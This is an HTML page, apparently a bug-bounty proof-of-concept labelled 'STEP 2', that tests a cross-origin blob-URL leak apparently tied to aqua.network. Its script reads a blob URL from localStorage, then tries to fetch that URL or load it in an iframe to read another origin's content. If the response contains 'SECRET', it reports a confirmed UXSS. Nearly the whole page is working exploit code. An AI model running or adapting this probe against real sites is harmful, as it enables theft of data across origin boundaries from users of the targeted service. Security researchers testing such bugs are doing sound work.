<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Blob Inheritance Test</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;padding:15px">
<h2>STEP 2 - Test di 0x403for</h2>
<pre id=log></pre>
<button onclick="checkLeak()" style="padding:14px;width:100%;background:#0f0">1. Check localStorage leak</button>
<button onclick="tryFetchBlob()" style="padding:14px;width:100%;background:#0f0;margin-top:6px">2. TRY FETCH blob: dari aqua.network</button>
<button onclick="tryIframeBlob()" style="padding:14px;width:100%;background:#0f0;margin-top:6px">3. TRY IFRAME blob:</button>
<iframe id=frame style="width:100%;height:200px;background:white"></iframe>
<script>
function log(t){document.getElementById('log').textContent+=t+'\n'}
function checkLeak(){
  let b=localStorage.getItem('aqua_blob_url');
  log('Leak: '+b);
}
async function tryFetchBlob(){
  let blobUrl=localStorage.getItem('aqua_blob_url');
  try{
    let res=await fetch(blobUrl);
    let text=await res.text();
    log('FETCH SUCCESS: '+text.substring(0,200));
    if(text.includes('SECRET')) log('>>> CRITICAL UXSS CONFIRMED');
  }catch(e){log('BLOCKED: '+e.message)}
}
function tryIframeBlob(){
  let blobUrl=localStorage.getItem('aqua_blob_url');
  document.getElementById('frame').src=blobUrl;
}
</script>
</body>
</html>
